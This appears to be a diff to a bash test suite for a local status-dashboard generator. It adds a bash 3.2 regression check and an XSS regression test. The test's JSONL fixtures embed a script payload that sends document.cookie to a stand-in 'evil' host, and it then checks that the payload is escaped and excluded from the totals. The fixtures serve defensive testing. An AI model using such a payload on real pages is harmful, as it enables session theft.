@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 #
 # Test: aai-live-status
-# (docs/specs/SPEC-DRAFT-spec-live-status-dashboard.md, TEST-001..020, 024..035)
+# (docs/specs/SPEC-DRAFT-spec-live-status-dashboard.md, TEST-001..020, 024..036)
 #
 # Verifies .aai/scripts/generate-live-status.mjs — the optional, zero-token,
 # zero-network live-status dashboard generator — plus its per-harness parser
@@ -738,7 +738,42 @@ SH
   [[ -s "$openerlog" ]] || log_fail "opener was never invoked: $(cat "$TEST_DIR/t031-watch.log")"
   grep -q "^MISSING" "$openerlog" && log_fail "opener received a nonexistent HTML path on first run (BLOCKING-2 regression): $(cat "$openerlog")"
   grep -q "^EXISTS" "$openerlog" || log_fail "opener never observed the HTML as EXISTS: $(cat "$openerlog")"
-  log_pass "TEST-031: --watch warm-up writes the HTML before the opener fires; no MISSING first run"
+
+  # BLOCKING-I (re-review 105110Z): the fix above (dropping --data-only from
+  # the warm-up) introduced a NEW regression — `node "$GEN" "${WARMUP_ARGS[@]}"`
+  # expands an EMPTY array under this script's own `set -u`, which bash < 4.4
+  # (bash 3.2.57, the ONLY bash on stock macOS and at /bin/bash on this
+  # machine) treats as an unbound-variable error, killing the script before
+  # it generates, opens, or watches anything. WARMUP_ARGS is empty for
+  # exactly one invocation: bare `--watch` with no other flag — the form
+  # documented at docs/product/live-status-dashboard.md:35 and the script's
+  # own usage line. The case above never catches this because
+  # `--watch --interval 1` leaves one surviving element in the array. Run
+  # bare `--watch` explicitly under `/bin/bash` (never bare `bash`, which
+  # could resolve to a newer non-stock bash on a contributor's PATH and
+  # silently satisfy this assertion without exercising the bug).
+  local openerlog2="$TEST_DIR/t031-opener-bare.log"
+  local openerbin2="$TEST_DIR/t031-opener-bare.sh"
+  : > "$openerlog2"
+  cat > "$openerbin2" <<SH
+#!/usr/bin/env bash
+if [[ -f "\$1" ]]; then echo "EXISTS \$1" >> "$openerlog2"; else echo "MISSING \$1" >> "$openerlog2"; fi
+SH
+  chmod +x "$openerbin2"
+
+  HOME="$fixture_home" USERPROFILE="$fixture_home" AAI_LIVE_OPENER="$openerbin2" \
+    CLAUDE_CONFIG_DIR="$fixture_home/.claude" CODEX_HOME="$fixture_home/.codex" GEMINI_HOME="$fixture_home/.gemini" \
+    /bin/bash "$scratch/.aai/scripts/aai-live.sh" --watch > "$TEST_DIR/t031-watch-bare.log" 2>&1 &
+  local pid2=$!
+  sleep 1
+  kill -INT "$pid2" 2>/dev/null || true
+  wait "$pid2" 2>/dev/null || true
+
+  grep -qi "unbound variable" "$TEST_DIR/t031-watch-bare.log" && log_fail "bare --watch (no other flags) under /bin/bash must not die on an unbound WARMUP_ARGS array (BLOCKING-I): $(cat "$TEST_DIR/t031-watch-bare.log")"
+  [[ -s "$openerlog2" ]] || log_fail "bare --watch: opener was never invoked: $(cat "$TEST_DIR/t031-watch-bare.log")"
+  grep -q "^MISSING" "$openerlog2" && log_fail "bare --watch: opener received a nonexistent HTML path on first run: $(cat "$openerlog2")"
+  grep -q "^EXISTS" "$openerlog2" || log_fail "bare --watch: opener never observed the HTML as EXISTS: $(cat "$openerlog2")"
+  log_pass "TEST-031: --watch warm-up writes the HTML before the opener fires; no MISSING first run; bare --watch survives /bin/bash's set -u (BLOCKING-I)"
 }
 
 # ============================ TEST-032 (Spec-AC-05) ============================
@@ -877,8 +912,67 @@ JSONL
   log_pass "TEST-035: truncated cache recovers with a named note and correct totals, never silent"
 }
 
+# ============================ TEST-036 (Spec-AC-10) ============================
+# Regression pin for BLOCKING-II (re-review 105110Z): the spend-rows render
+# branch (generate-live-status.mjs:507) was the ONLY remaining na() call on
+# foreign-derived data in renderHtml — na() does not escape, unlike naEsc().
+# The enabling gap sat one layer below: claude-code.mjs's and codex.mjs's
+# usageTotal() summed foreign harness fields with `(field || 0) + ...` and no
+# Number() coercion, so a truthy non-numeric field (e.g. a string) turned `+`
+# into string concatenation, propagating verbatim through usageToday
+# accumulation into the rendered cell — a live <script> in a page whose
+# entire value proposition is "no network reference, ever" (Spec-AC-10).
+# Both layers are fixed together: the parser boundary now nulls out (honest
+# N/A / excluded, never a fabricated 0) on a non-coercible field, AND the
+# render site now uses naEsc() as defense in depth.
+test_036_hostile_token_field_escaped_and_coerced() {
+  log_info "Test: a hostile/non-numeric token field renders with zero live <script> tags and a real number, never concatenated garbage (BLOCKING-II)..."
+  local h; h="$(mk_home t036)"
+  mkdir -p "$h/.claude/projects/proj" "$h/.codex/sessions/2026/08/08"
+  # Claude Code: one clean record (input_tokens=7, output_tokens=3 -> 10) plus
+  # one hostile record whose input_tokens is a script-tag string. The clean
+  # total must survive untouched; the hostile record must be excluded, never
+  # silently absorbed as a fabricated 0 nor concatenated into the total.
+  cat > "$h/.claude/projects/proj/s1.jsonl" <<'JSONL'
+{"type":"assistant","sessionId":"s1","cwd":"/x/proj","timestamp":"2026-08-08T10:00:00.000Z","requestId":"r1","message":{"id":"m1","model":"m","usage":{"input_tokens":7,"output_tokens":3,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
+{"type":"assistant","sessionId":"s1","cwd":"/x/proj","timestamp":"2026-08-08T10:05:00.000Z","requestId":"r2","message":{"id":"m2","model":"m","usage":{"input_tokens":"<script>fetch('http://evil/'+document.cookie)</script>","output_tokens":0,"cache_creation_input_tokens":0,"cache_read_input_tokens":0}}}
+JSONL
+  # Codex: partial-shape payload (no total_tokens, so the manual-sum
+  # fallback runs) with a hostile cached_input_tokens field — the fallback
+  # branch the review found unguarded (only the total_tokens branch had a
+  # typeof check).
+  cat > "$h/.codex/sessions/2026/08/08/rollout-1-abc.jsonl" <<'JSONL'
+{"type":"session_meta","timestamp":"2026-08-08T09:00:00.000Z","payload":{"session_id":"cx1","cwd":"/x/codexproj"}}
+{"type":"event_msg","timestamp":"2026-08-08T09:02:00.000Z","payload":{"type":"token_count","info":{"total_token_usage":{"input_tokens":20,"output_tokens":10,"cached_input_tokens":"<script>fetch('http://evil/'+document.cookie)</script>"}}}}
+JSONL
+  run_gen "$h"
+  [[ "$EC" == 0 ]] || log_fail "must exit 0: $(cat "$OUT")"
+
+  local n; n="$(node -e '
+    const fs=require("fs"); const h=fs.readFileSync(process.argv[1],"utf8");
+    process.stdout.write(String((h.match(/<script/gi)||[]).length));
+  ' "$HTML")"
+  [[ "$n" == "0" ]] || log_fail "html must carry zero live <script tags from a hostile token field, found $n"
+
+  local ccUsage; ccUsage="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='claude-code')||{}).usage_today")"
+  [[ "$ccUsage" == "10" ]] || log_fail "claude-code usage_today must be the clean total 10 (hostile record excluded, never concatenated), got: $ccUsage"
+  node -e '
+    const v = process.argv[1];
+    if (!/^-?\d+(\.\d+)?$/.test(v)) { process.stderr.write("not a plain number: " + v + "\n"); process.exit(1); }
+  ' "$ccUsage" || log_fail "claude-code usage_today must be a plain number, not concatenated garbage"
+
+  local cxUsage; cxUsage="$(node_get "$DATA" "(m.harnesses.find(h=>h.id==='codex')||{}).usage_today")"
+  node -e '
+    const v = process.argv[1];
+    if (v !== "null" && !/^-?\d+(\.\d+)?$/.test(v)) { process.stderr.write("not null and not a plain number: " + v + "\n"); process.exit(1); }
+  ' "$cxUsage" || log_fail "codex usage_today must be null or a plain number, never concatenated garbage, got: $cxUsage"
+
+  grep -qi "<script" "$HTML" && log_fail "html must carry no <script> tag anywhere on the page"
+  log_pass "TEST-036: hostile token field renders zero live <script> tags and a real number (BLOCKING-II)"
+}
+
 main() {
-  echo "Testing $TEST_NAME (SPEC spec-live-status-dashboard TEST-001..020, 024..035)"
+  echo "Testing $TEST_NAME (SPEC spec-live-status-dashboard TEST-001..020, 024..036)"
   check_deps
   setup_fixture
   test_001_run_writes_both_outputs
@@ -913,6 +1007,7 @@ main() {
   test_033_unreadable_file_named_in_notes
   test_034_ts_less_record_named_not_silent
   test_035_truncated_cache_recovers_honestly
+  test_036_hostile_token_field_escaped_and_coerced
   echo ""
   log_pass "All $TEST_NAME tests passed"
 }
